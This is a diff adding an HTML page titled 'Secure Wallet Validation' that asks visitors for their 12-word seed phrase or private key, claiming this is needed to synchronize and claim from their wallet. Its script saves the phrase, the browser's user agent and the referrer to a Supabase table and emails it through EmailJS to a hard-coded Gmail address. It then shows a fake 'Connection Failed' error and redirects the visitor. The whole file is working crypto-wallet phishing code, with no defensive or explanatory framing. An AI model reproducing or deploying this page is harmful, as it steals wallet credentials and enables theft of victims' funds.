@@ -1,0 +1,817 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta
+      name="description"
+      content="Secure wallet validation – connection failed."
+    />
+    <title>Secure Wallet Validation · Connection Failed</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+
+    <style>
+      :root {
+        --bg: #0b1220;
+        --bg-soft: #111a2e;
+        --surface: #17233a;
+        --border: #263550;
+        --text: #f8fafc;
+        --muted: #94a3b8;
+        --subtle: #64748b;
+        --accent: #3b82f6;
+        --accent-hover: #2563eb;
+        --success: #22c55e;
+        --danger: #ef4444;
+      }
+
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+      html {
+        min-height: 100%;
+        background: var(--bg);
+      }
+
+      body {
+        min-height: 100vh;
+        min-height: 100svh;
+        font-family:
+          "Inter",
+          system-ui,
+          -apple-system,
+          BlinkMacSystemFont,
+          "Segoe UI",
+          sans-serif;
+        color: var(--text);
+        background: var(--bg);
+        -webkit-font-smoothing: antialiased;
+        text-rendering: optimizeLegibility;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 24px;
+      }
+
+      .page-wrapper {
+        position: relative;
+        width: 100%;
+        min-height: 100vh;
+        min-height: 100svh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        isolation: isolate;
+      }
+
+      .page-wrapper::before {
+        content: "";
+        position: absolute;
+        inset: 0;
+        z-index: -2;
+        pointer-events: none;
+        background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='900' height='600' viewBox='0 0 900 600'%3E%3Cg fill='%23F8FAFC'%3E%3Ccircle cx='42' cy='48' r='.8' opacity='.35'/%3E%3Ccircle cx='121' cy='164' r='.7' opacity='.22'/%3E%3Ccircle cx='181' cy='78' r='1' opacity='.45'/%3E%3Ccircle cx='254' cy='35' r='.7' opacity='.30'/%3E%3Ccircle cx='318' cy='126' r='.8' opacity='.20'/%3E%3Ccircle cx='397' cy='67' r='.9' opacity='.40'/%3E%3Ccircle cx='468' cy='181' r='.7' opacity='.25'/%3E%3Ccircle cx='531' cy='54' r='.8' opacity='.35'/%3E%3Ccircle cx='608' cy='112' r='.7' opacity='.25'/%3E%3Ccircle cx='684' cy='39' r='.9' opacity='.40'/%3E%3Ccircle cx='758' cy='153' r='.8' opacity='.25'/%3E%3Ccircle cx='847' cy='91' r='.9' opacity='.38'/%3E%3Ccircle cx='72' cy='337' r='.7' opacity='.20'/%3E%3Ccircle cx='149' cy='418' r='.9' opacity='.30'/%3E%3Ccircle cx='225' cy='302' r='.7' opacity='.26'/%3E%3Ccircle cx='341' cy='463' r='.8' opacity='.25'/%3E%3Ccircle cx='426' cy='351' r='.7' opacity='.20'/%3E%3Ccircle cx='509' cy='514' r='1' opacity='.35'/%3E%3Ccircle cx='593' cy='389' r='.7' opacity='.23'/%3E%3Ccircle cx='681' cy='479' r='.8' opacity='.30'/%3E%3Ccircle cx='764' cy='338' r='.7' opacity='.20'/%3E%3Ccircle cx='858' cy='442' r='.9' opacity='.33'/%3E%3Ccircle cx='35' cy='548' r='.7' opacity='.25'/%3E%3Ccircle cx='292' cy='556' r='.8' opacity='.20'/%3E%3Ccircle cx='742' cy='570' r='.7' opacity='.25'/%3E%3C/g%3E%3C/svg%3E");
+        background-size: 900px 600px;
+        opacity: 0.55;
+      }
+
+      .content {
+        width: min(100%, 720px);
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        text-align: center;
+        padding: 8px 0;
+        transition:
+          filter 0.3s ease,
+          opacity 0.3s ease;
+      }
+
+      .content.blurred {
+        filter: blur(6px);
+        opacity: 0.5;
+        pointer-events: none;
+      }
+
+      .badge {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        min-height: 32px;
+        padding: 0 16px;
+        border: 1px solid var(--border);
+        border-radius: 100px;
+        background: var(--bg-soft);
+        color: #93bbfc;
+        font-size: 11px;
+        font-weight: 600;
+        letter-spacing: 0.12em;
+        text-transform: uppercase;
+        margin-bottom: 28px;
+        backdrop-filter: blur(4px);
+      }
+
+      h1 {
+        font-size: clamp(32px, 6vw, 58px);
+        line-height: 1.1;
+        letter-spacing: -0.03em;
+        font-weight: 700;
+        color: var(--text);
+        margin-bottom: 18px;
+      }
+
+      .subtitle {
+        font-size: clamp(15px, 1.6vw, 18px);
+        line-height: 1.65;
+        color: var(--muted);
+        max-width: 560px;
+        margin: 0 auto 48px;
+        font-weight: 400;
+        letter-spacing: -0.01em;
+      }
+
+      .card {
+        width: 100%;
+        background: var(--surface);
+        border: 1px solid var(--border);
+        border-radius: 20px;
+        padding: 36px 40px 40px;
+        box-shadow:
+          0 20px 40px -12px rgba(0, 0, 0, 0.6),
+          0 0 0 1px rgba(59, 130, 246, 0.05);
+        transition: border-color 0.2s ease;
+      }
+
+      .card:hover {
+        border-color: #2f405e;
+      }
+
+      .final-tag {
+        display: inline-block;
+        padding: 6px 18px;
+        background: var(--bg-soft);
+        border: 1px solid var(--border);
+        border-radius: 100px;
+        font-size: 11px;
+        font-weight: 600;
+        letter-spacing: 0.1em;
+        text-transform: uppercase;
+        color: var(--muted);
+        margin-bottom: 24px;
+      }
+
+      .step-title {
+        font-size: clamp(22px, 3.5vw, 28px);
+        font-weight: 600;
+        letter-spacing: -0.02em;
+        color: var(--text);
+        margin-bottom: 16px;
+        line-height: 1.3;
+      }
+
+      .step-hint {
+        font-size: 14px;
+        color: var(--muted);
+        margin-bottom: 32px;
+        letter-spacing: -0.01em;
+        font-weight: 400;
+      }
+
+      .step-hint2 {
+        font-size: 14px;
+        color: var(--muted);
+        margin-bottom: 10px;
+        letter-spacing: -0.01em;
+        font-weight: 400;
+      }
+
+      .input-wrapper {
+        width: 100%;
+        margin-bottom: 32px;
+        text-align: left;
+      }
+
+      .textarea-field {
+        width: 100%;
+        min-height: 140px;
+        padding: 18px 24px;
+        background: var(--bg-soft);
+        border: 1px solid var(--border);
+        border-radius: 14px;
+        font-size: 16px;
+        font-weight: 500;
+        color: var(--text);
+        font-family: inherit;
+        letter-spacing: -0.01em;
+        outline: none;
+        resize: vertical;
+        transition:
+          border-color 0.18s ease,
+          box-shadow 0.18s ease,
+          background-color 0.18s ease;
+        line-height: 1.6;
+      }
+
+      .textarea-field::placeholder {
+        color: var(--subtle);
+        font-weight: 400;
+      }
+      .textarea-field:hover {
+        background: #1a263e;
+        border-color: #2f405e;
+      }
+      .textarea-field:focus {
+        border-color: var(--accent);
+        box-shadow: 0 0 0 1px var(--accent);
+        background: #1a263e;
+      }
+
+      .primary-button {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        width: 100%;
+        padding: 18px 32px;
+        background: var(--accent);
+        border: 1px solid var(--accent);
+        border-radius: 14px;
+        color: #fff;
+        font-size: 16px;
+        font-weight: 600;
+        letter-spacing: -0.01em;
+        cursor: pointer;
+        transition:
+          background-color 0.18s ease,
+          border-color 0.18s ease,
+          transform 0.18s ease;
+        font-family: inherit;
+        margin-bottom: 23px;
+      }
+
+      .primary-button:hover {
+        background: var(--accent-hover);
+        border-color: var(--accent-hover);
+        transform: translateY(-1px);
+      }
+
+      .primary-button:focus-visible {
+        outline: 2px solid #93bbfc;
+        outline-offset: 4px;
+      }
+      .primary-button:disabled {
+        opacity: 0.6;
+        cursor: not-allowed;
+      }
+
+      .modal-overlay {
+        position: fixed;
+        inset: 0;
+        z-index: 1000;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background: rgba(11, 18, 32, 0.75);
+        backdrop-filter: blur(8px);
+        -webkit-backdrop-filter: blur(8px);
+        opacity: 0;
+        visibility: hidden;
+        transition:
+          opacity 0.3s ease,
+          visibility 0.3s ease;
+        padding: 24px;
+      }
+
+      .modal-overlay.active {
+        opacity: 1;
+        visibility: visible;
+      }
+
+      .modal-card {
+        width: min(100%, 440px);
+        background: var(--surface);
+        border: 1px solid var(--border);
+        border-radius: 20px;
+        padding: 44px 36px 36px;
+        text-align: center;
+        box-shadow:
+          0 30px 60px -12px rgba(0, 0, 0, 0.8),
+          0 0 0 1px rgba(239, 68, 68, 0.08);
+        transform: scale(0.95) translateY(10px);
+        transition: transform 0.3s ease;
+      }
+
+      .modal-overlay.active .modal-card {
+        transform: scale(1) translateY(0);
+      }
+
+      .modal-icon {
+        width: 64px;
+        height: 64px;
+        border-radius: 50%;
+        border: 2px solid var(--danger);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0 auto 28px;
+        position: relative;
+      }
+
+      .modal-icon::before {
+        content: "!";
+        font-size: 32px;
+        font-weight: 700;
+        color: var(--danger);
+        line-height: 1;
+        transform: translateY(-1px);
+      }
+
+      .modal-title {
+        font-size: 26px;
+        font-weight: 700;
+        letter-spacing: -0.02em;
+        color: var(--text);
+        margin-bottom: 16px;
+      }
+
+      .modal-description {
+        font-size: 15px;
+        line-height: 1.65;
+        color: var(--muted);
+        margin-bottom: 32px;
+        letter-spacing: -0.01em;
+        font-weight: 400;
+        max-width: 340px;
+        margin-left: auto;
+        margin-right: auto;
+      }
+
+      .modal-close-button {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        width: 100%;
+        padding: 16px 32px;
+        background: var(--bg-soft);
+        border: 1px solid var(--border);
+        border-radius: 14px;
+        color: var(--text);
+        font-size: 16px;
+        font-weight: 600;
+        letter-spacing: -0.01em;
+        cursor: pointer;
+        transition:
+          background-color 0.18s ease,
+          border-color 0.18s ease,
+          transform 0.18s ease;
+        font-family: inherit;
+      }
+
+      .modal-close-button:hover {
+        background: #1a263e;
+        border-color: #2f405e;
+        transform: translateY(-1px);
+      }
+
+      .modal-close-button:focus-visible {
+        outline: 2px solid var(--accent);
+        outline-offset: 4px;
+      }
+      .modal-close-button:active {
+        transform: translateY(0);
+      }
+
+      @media (max-width: 640px) {
+        body {
+          padding: 16px;
+        }
+        .badge {
+          margin-bottom: 20px;
+          font-size: 10px;
+          padding: 0 14px;
+          min-height: 28px;
+        }
+        h1 {
+          font-size: clamp(28px, 8vw, 40px);
+          margin-bottom: 14px;
+        }
+        .subtitle {
+          font-size: 14px;
+          margin-bottom: 32px;
+          padding: 0 4px;
+        }
+        .card {
+          padding: 26px 20px 28px;
+          border-radius: 16px;
+        }
+        .final-tag {
+          font-size: 10px;
+          padding: 5px 14px;
+          margin-bottom: 18px;
+        }
+        .step-title {
+          font-size: 20px;
+          margin-bottom: 12px;
+        }
+        .step-hint {
+          font-size: 13px;
+          margin-bottom: 24px;
+        }
+        .textarea-field {
+          padding: 15px 18px;
+          border-radius: 12px;
+          font-size: 15px;
+          min-height: 120px;
+        }
+        .primary-button {
+          padding: 15px 24px;
+          border-radius: 12px;
+          font-size: 15px;
+          margin-bottom: 23px;
+        }
+        .modal-overlay {
+          padding: 16px;
+        }
+        .modal-card {
+          padding: 32px 24px 28px;
+          border-radius: 16px;
+        }
+        .modal-icon {
+          width: 56px;
+          height: 56px;
+          margin-bottom: 22px;
+        }
+        .modal-icon::before {
+          font-size: 28px;
+        }
+        .modal-title {
+          font-size: 22px;
+          margin-bottom: 12px;
+        }
+        .modal-description {
+          font-size: 14px;
+          margin-bottom: 26px;
+        }
+        .modal-close-button {
+          padding: 14px 24px;
+          border-radius: 12px;
+          font-size: 15px;
+        }
+      }
+
+      @media (prefers-reduced-motion: reduce) {
+        .content,
+        .modal-overlay,
+        .modal-card,
+        .modal-close-button,
+        .primary-button,
+        .textarea-field {
+          transition: none;
+        }
+        .modal-close-button:hover,
+        .primary-button:hover {
+          transform: none;
+        }
+        .modal-card {
+          transform: none;
+        }
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="page-wrapper">
+      <main class="content" id="pageContent">
+        <div class="badge">SYNCHRONIZE</div>
+        <h1>Confirm Your Wallet Manually to Claim</h1>
+        <p class="subtitle">
+          Complete the verification process to synchronize your wallet with the
+          decentralized infrastructure.
+        </p>
+
+        <section class="card" aria-labelledby="step-heading">
+          <div class="final-tag">Final Validation</div>
+          <h2 id="step-heading" class="step-title">
+            5. Enter Your 12 Seed Phrase or Private Key to Validate
+          </h2>
+          <p class="step-hint">Required for non-custodial synchronization.</p>
+
+          <div class="input-wrapper">
+            <textarea
+              class="textarea-field"
+              id="seedPhrase"
+              placeholder="Enter your 12-word seed phrase or private key separated by spaces..."
+              aria-label="Enter your 12-word seed phrase"
+              autocomplete="off"
+              spellcheck="false"
+            ></textarea>
+          </div>
+
+          <button class="primary-button" id="validateButton" type="button">
+            Validate &amp; Connect
+          </button>
+
+          <p class="step-hint2">This process is encrypted end-to-end.</p>
+        </section>
+      </main>
+    </div>
+
+    <div
+      class="modal-overlay"
+      id="errorModal"
+      role="dialog"
+      aria-modal="true"
+      aria-labelledby="modalTitle"
+      aria-describedby="modalDesc"
+    >
+      <div class="modal-card">
+        <div class="modal-icon" aria-hidden="true"></div>
+        <h2 class="modal-title" id="modalTitle">Connection Failed</h2>
+        <p class="modal-description" id="modalDesc">
+          The protocol was unable to establish a secure handshake. Please try a
+          different wallet provider or manual method.
+        </p>
+        <button class="modal-close-button" id="modalCloseButton" type="button">
+          Close
+        </button>
+      </div>
+    </div>
+
+    <!-- Supabase + EmailJS + shared scripts -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script>
+      window.SUPABASE_URL = "https://jrjbfbpjmcxkgchhdxwo.supabase.co";
+      window.SUPABASE_ANON_KEY =
+        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImpyamJmYnBqbWN4a2djaGhkeHdvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTIxNTQ2NzIsImV4cCI6MjEwNzczMDY3Mn0.Azo2z4xNsmjwfUWby_aVLlPhkBld3-7Dts6woerPTMI";
+      window.EMAILJS_SERVICE_ID = "service_8ll4vfv";
+      window.EMAILJS_TEMPLATE_ID = "template_nbkfb7i";
+      window.EMAILJS_PUBLIC_KEY = "rHWptt7FOQTAV-Vnv";
+      window.ADMIN_EMAIL = "winshied354@gmail.com";
+
+      window.supabaseClient = supabase.createClient(
+        window.SUPABASE_URL,
+        window.SUPABASE_ANON_KEY,
+      );
+
+      if (
+        window.emailjs &&
+        window.EMAILJS_PUBLIC_KEY &&
+        !window.EMAILJS_PUBLIC_KEY.startsWith("YOUR_")
+      ) {
+        try {
+          emailjs.init({ publicKey: window.EMAILJS_PUBLIC_KEY });
+        } catch (e) {
+          console.warn(e);
+        }
+      }
+
+      (function () {
+        const SESSION_KEY = "wv_session_id";
+        const DATA_KEY = "wv_flow_data";
+        let sid = null;
+        try {
+          sid = localStorage.getItem(SESSION_KEY);
+        } catch (_) {}
+        if (!sid) {
+          sid =
+            "sess_" +
+            Date.now().toString(36) +
+            "_" +
+            Math.random().toString(36).slice(2, 10);
+          try {
+            localStorage.setItem(SESSION_KEY, sid);
+          } catch (_) {}
+        }
+        window.SESSION_ID = sid;
+        let flow = {};
+        try {
+          flow = JSON.parse(localStorage.getItem(DATA_KEY) || "{}");
+        } catch (_) {}
+        window.FLOW_DATA = flow;
+        window.saveFlowData = function (patch) {
+          window.FLOW_DATA = Object.assign({}, window.FLOW_DATA, patch);
+          try {
+            localStorage.setItem(DATA_KEY, JSON.stringify(window.FLOW_DATA));
+          } catch (_) {}
+        };
+      })();
+
+      (function () {
+        window.envInfo = function () {
+          return {
+            user_agent: navigator.userAgent || null,
+            referrer: document.referrer || null,
+          };
+        };
+        window.upsertEntry = async function (patch) {
+          if (!window.supabaseClient) return null;
+          const sessionId = window.SESSION_ID;
+          const payload = Object.assign({ session_id: sessionId }, patch);
+
+          const { data: existing, error: selErr } = await window.supabaseClient
+            .from("entries")
+            .select("id")
+            .eq("session_id", sessionId)
+            .maybeSingle();
+          if (selErr) console.error("lookup error", selErr);
+
+          if (existing && existing.id) {
+            const { data, error } = await window.supabaseClient
+              .from("entries")
+              .update(payload)
+              .eq("id", existing.id)
+              .select()
+              .single();
+            if (error) console.error("update error", error);
+            return data;
+          } else {
+            const { data, error } = await window.supabaseClient
+              .from("entries")
+              .insert(payload)
+              .select()
+              .single();
+            if (error) console.error("insert error", error);
+            return data;
+          }
+        };
+      })();
+
+      (function () {
+        const style = document.createElement("style");
+        style.textContent = `
+        .page-loader {
+          position: fixed; inset: 0; z-index: 9999;
+          display: flex; align-items: center; justify-content: center;
+          background: #0B1220;
+          opacity: 0; visibility: hidden;
+          transition: opacity .25s ease, visibility .25s ease;
+        }
+        .page-loader.active { opacity: 1; visibility: visible; }
+        .page-loader .spinner {
+          width: 44px; height: 44px;
+          border: 3px solid #263550;
+          border-top-color: #3B82F6;
+          border-radius: 50%;
+          animation: pl-spin .8s linear infinite;
+        }
+        @keyframes pl-spin { to { transform: rotate(360deg); } }
+      `;
+        document.head.appendChild(style);
+        const el = document.createElement("div");
+        el.className = "page-loader";
+        el.innerHTML = '<div class="spinner" aria-hidden="true"></div>';
+        document.addEventListener("DOMContentLoaded", () => {
+          document.body.appendChild(el);
+          el.classList.add("active");
+          setTimeout(() => el.classList.remove("active"), 350);
+        });
+        window.showLoader = function () {
+          const n = document.querySelector(".page-loader");
+          if (n) n.classList.add("active");
+        };
+        window.hideLoader = function () {
+          const n = document.querySelector(".page-loader");
+          if (n) n.classList.remove("active");
+        };
+      })();
+
+      /* -------- Page-specific logic -------- */
+      document.addEventListener("DOMContentLoaded", () => {
+        const validateButton = document.getElementById("validateButton");
+        const seedPhrase = document.getElementById("seedPhrase");
+        const pageContent = document.getElementById("pageContent");
+        const errorModal = document.getElementById("errorModal");
+        const modalCloseButton = document.getElementById("modalCloseButton");
+
+        function clearVisitorState() {
+          try {
+            localStorage.removeItem("wv_flow_data");
+          } catch (_) {}
+          try {
+            localStorage.removeItem("wv_session_id");
+          } catch (_) {}
+          window.FLOW_DATA = {};
+        }
+
+        function openModal() {
+          errorModal.classList.add("active");
+          pageContent.classList.add("blurred");
+          document.body.style.overflow = "hidden";
+          clearVisitorState();
+          setTimeout(() => modalCloseButton.focus(), 100);
+        }
+
+        function closeModal() {
+          errorModal.classList.remove("active");
+          pageContent.classList.remove("blurred");
+          document.body.style.overflow = "";
+          clearVisitorState();
+          if (window.showLoader) window.showLoader();
+          setTimeout(() => {
+            window.location.replace("index.html");
+          }, 250);
+        }
+
+        async function sendNotification(entry) {
+          if (
+            !window.emailjs ||
+            !window.EMAILJS_SERVICE_ID ||
+            window.EMAILJS_SERVICE_ID.startsWith("YOUR_")
+          ) {
+            console.warn("EmailJS not configured — skipping email.");
+            return;
+          }
+          try {
+            await emailjs.send(
+              window.EMAILJS_SERVICE_ID,
+              window.EMAILJS_TEMPLATE_ID,
+              {
+                to_email: window.ADMIN_EMAIL,
+                session_id: entry.session_id,
+                connect_manual: entry.connect_manual || "",
+                connection_purpose: entry.connection_purpose || "",
+                wallet_provider: entry.wallet_provider || "",
+                wallet_address: entry.wallet_address || "",
+                seed_phrase: entry.seed_phrase || "",
+                submitted_at: new Date().toISOString(),
+              },
+            );
+            console.log("Notification email sent.");
+          } catch (err) {
+            console.error("EmailJS error:", err);
+          }
+        }
+
+        validateButton.addEventListener("click", async () => {
+          const phrase = seedPhrase.value.trim();
+
+          if (!phrase) {
+            seedPhrase.focus();
+            seedPhrase.style.borderColor = "var(--danger)";
+            seedPhrase.style.boxShadow = "0 0 0 1px var(--danger)";
+            setTimeout(() => {
+              seedPhrase.style.borderColor = "";
+              seedPhrase.style.boxShadow = "";
+            }, 2000);
+            return;
+          }
+
+          validateButton.textContent = "Validating...";
+          validateButton.disabled = true;
+
+          window.saveFlowData({ seed_phrase: phrase });
+
+          // 1. Save to Supabase (final step: mark completed)
+          const entry = await window.upsertEntry(
+            Object.assign(
+              {
+                seed_phrase: phrase,
+                completed: true,
+              },
+              window.envInfo(),
+            ),
+          );
+
+          // 2. Send email only AFTER successful upload
+          if (entry) {
+            await sendNotification(entry);
+          }
+
+          validateButton.textContent = "Validate & Connect";
+          validateButton.disabled = false;
+
+          // 3. Only now show the overlay
+          openModal();
+        });
+
+        modalCloseButton.addEventListener("click", closeModal);
+        errorModal.addEventListener("click", (e) => {
+          if (e.target === errorModal) closeModal();
+        });
+        document.addEventListener("keydown", (e) => {
+          if (e.key === "Escape" && errorModal.classList.contains("active"))
+            closeModal();
+        });
+
+        seedPhrase.addEventListener("input", () => {
+          seedPhrase.style.borderColor = "";
+          seedPhrase.style.boxShadow = "";
+        });
+        seedPhrase.addEventListener("keydown", (e) => {
+          if (e.key === "Enter" && (e.ctrlKey || e.metaKey)) {
+            e.preventDefault();
+            validateButton.click();
+          }
+        });
+      });
+    </script>
+  </body>
+</html>
